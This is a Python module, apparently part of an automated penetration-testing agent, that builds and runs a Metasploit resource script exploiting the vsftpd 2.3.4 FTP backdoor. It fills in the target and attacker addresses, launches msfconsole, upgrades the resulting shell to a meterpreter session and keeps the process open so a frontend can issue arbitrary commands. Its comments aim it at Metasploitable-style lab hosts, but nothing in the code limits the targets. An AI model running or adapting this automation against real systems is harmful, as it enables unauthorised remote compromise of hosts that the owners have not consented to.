#!/usr/bin/env python3
"""
NODE 7 BACKUP M2: MANUAL EXPLOIT TEMPLATE RUNNER
Executes known working exploits for Linux 2.6.x systems
Simple template-based approach - just replace placeholders and run
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os
import random

# Global dict to store active msfconsole processes by exploitation_id
# This allows socket_handler to send commands to the process
ACTIVE_MSFCONSOLE_PROCESSES: Dict[str, subprocess.Popen] = {}


def node_7_backup_m2_manual_exploit_to_rc(state: Dict) -> Dict:
    """
    NODE 7 BACKUP M2: Run Manual Exploit Template for Linux 2.6.x

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    Final fallback after Node 6 if NO meterpreter session obtained and OS is
    in supported range (Linux 2.6.x - Metasploitable):

    1. Check if OS is Linux 2.6.x
    2. Take manual exploit template
    3. Replace placeholders: {TARGET_IP}, {PORT}, {LHOST}, {LPORT}
    4. Write to pwn.rc file
    5. Execute via msfconsole
    6. Check for meterpreter session

    Template Example:
        use exploit/unix/ftp/vsftpd_234_backdoor
        set RHOSTS {TARGET_IP}
        set RPORT {PORT}
        set LHOST {LHOST}
        set LPORT {LPORT}
        run -z

        sleep 3
        sessions -u 1
        sleep 5
        sessions

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    Required:
    - target: Target IP address
    - port: Target port
    - os_type: Detected OS string
    - lhost: Attacker IP address
    - session_dir: Path to session directory
    - msf_client: Metasploit RPC client

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "node_7_backup_m2"
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True/False
    - privilege_level: "high" or "low"

    On OS Not in Range:
    - pwn_rc_generated: False
    - error: "OS not in supported range (Linux 2.6.x required)"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message
    """

    logger = logging.getLogger("red_agent.node_7_backup_m2")

    logger.info("═" * 80)
    logger.info("NODE 7 BACKUP M2: MANUAL EXPLOIT TEMPLATE RUNNER")
    logger.info("(Final fallback after Node 6 for Linux 2.6.x systems)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: CHECK OS RANGE (Linux 2.6.x ONLY)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Checking OS Range")
    logger.info("─" * 80)

    os_type = state.get("os_type", "Linux")

    # Check if OS is in supported range (Linux 2.6.x)
    if not ("2.6" in str(os_type).lower()):
        logger.error("❌ OS NOT IN SUPPORTED RANGE")
        logger.error(f"   Detected OS: {os_type}")
        logger.error(f"   Required: Linux 2.6.x (Metasploitable)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"OS not in supported range. Got: {os_type}, Required: Linux 2.6.x"
        }

    logger.info(f"✓ OS in supported range: {os_type}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: EXTRACT TARGET INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Node 7 ALWAYS uses port 21 for FTP (ignore port from state)
    ftp_port = 21

    if not all([target, lhost]):
        logger.error("❌ Missing required parameters (target, lhost)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target or lhost"
        }

    logger.info(f"✓ Target: {target}:{ftp_port} (FTP)")
    logger.info(f"✓ Exploit: exploit/unix/ftp/vsftpd_234_backdoor")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: CREATE PWN.RC FROM TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Creating pwn.rc from template")
    logger.info("─" * 80)

    # Generate random LPORT to avoid conflicts
    lport = random.randint(7000, 8999)

    # Manual exploit template - always uses port 21 for FTP
    # Keep handler alive for 1 hour so sessions persist and user can interact
    template = """use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {TARGET_IP}
set RPORT {FTP_PORT}
set LHOST {LHOST}
set LPORT {LPORT}
run -z

sleep 30

sessions -u 1

sleep 30

sessions
"""

    # Replace placeholders with actual values
    pwn_rc_content = template.format(
        TARGET_IP=target,
        FTP_PORT=ftp_port,
        LHOST=lhost,
        LPORT=lport
    )

    logger.info(f"✓ Template placeholders replaced:")
    logger.info(f"  TARGET_IP → {target}")
    logger.info(f"  FTP_PORT → {ftp_port} (always 21)")
    logger.info(f"  LHOST → {lhost}")
    logger.info(f"  LPORT → {lport}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving pwn.rc file")
    logger.info("─" * 80)

    try:
        # Use session_dir if available
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_7_manual_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(pwn_rc_content)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Executing manual exploit template...")
    logger.info("")

    try:
        # Use Popen with unbuffered output for real-time streaming
        logger.info("═" * 80)
        logger.info("MSFCONSOLE OUTPUT (Real-time):")
        logger.info("═" * 80)

        process = subprocess.Popen(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Merge stderr into stdout for combined output
            stdin=subprocess.PIPE,  # Keep stdin OPEN for interactive commands from frontend
            text=True,
            bufsize=1,  # Line-buffered
            universal_newlines=True
        )

        # Store process globally so socket_handler can send commands to it
        exploitation_id = state.get("exploitation_id", "unknown")
        ACTIVE_MSFCONSOLE_PROCESSES[exploitation_id] = process
        logger.info(f"✓ Stored msfconsole process (PID: {process.pid}) for interactive commands")

        # Read output line-by-line in real-time as process runs
        # We'll read for ~30 seconds to see exploit output, then move on
        # msfconsole keeps running in background with handler active
        line_count = 0
        start_time = time.time()

        # Read output for 60 seconds to capture all exploit output and shell upgrade
        start_time = time.time()
        while time.time() - start_time < 60:
            try:
                line = process.stdout.readline()
                if line:
                    if line.strip() and "stty" not in line.lower() and "inappropriate ioctl" not in line.lower():
                        logger.info(line.rstrip('\n'))
                        line_count += 1
                        # Reset timeout if we're still getting output
                        start_time = time.time()
                else:
                    # No more output, stop reading
                    break
            except:
                break

        logger.info("═" * 80)
        logger.info(f"✓ Processed {line_count} output lines")
        logger.info("")
        logger.info("✓ msfconsole running with handler active for 1 hour")
        logger.info("✓ User can now execute interactive commands from frontend")
        logger.info("✓ Process stored and ready for interactive mode")

        # Don't wait - process runs in background
        # User can send commands via socket handler while it's running
        time.sleep(3)

    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: SUCCESS - INTERACTIVE PROCESS STORED
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Success - Interactive Mode Ready")
    logger.info("─" * 80)
    logger.info("")
    logger.info("✅ Node 7 Complete")
    logger.info("✅ msfconsole process stored and ready for interactive commands")
    logger.info("✅ User can now execute arbitrary msfconsole commands from frontend")
    logger.info("")
    logger.info("Note: Session status will be checked when user executes commands")
    logger.info("      or can be checked via interactive 'sessions' command")
    logger.info("")

    return {
        **state,
        "pwn_rc_generated": True,
        "pwn_rc_path": str(pwn_rc_path),
        "pwn_rc_source": "node_7_backup_m2",
        "interactive_mode": True,
        "process_stored": True,
        "note": "msfconsole running interactively - user can send commands from frontend"
    }
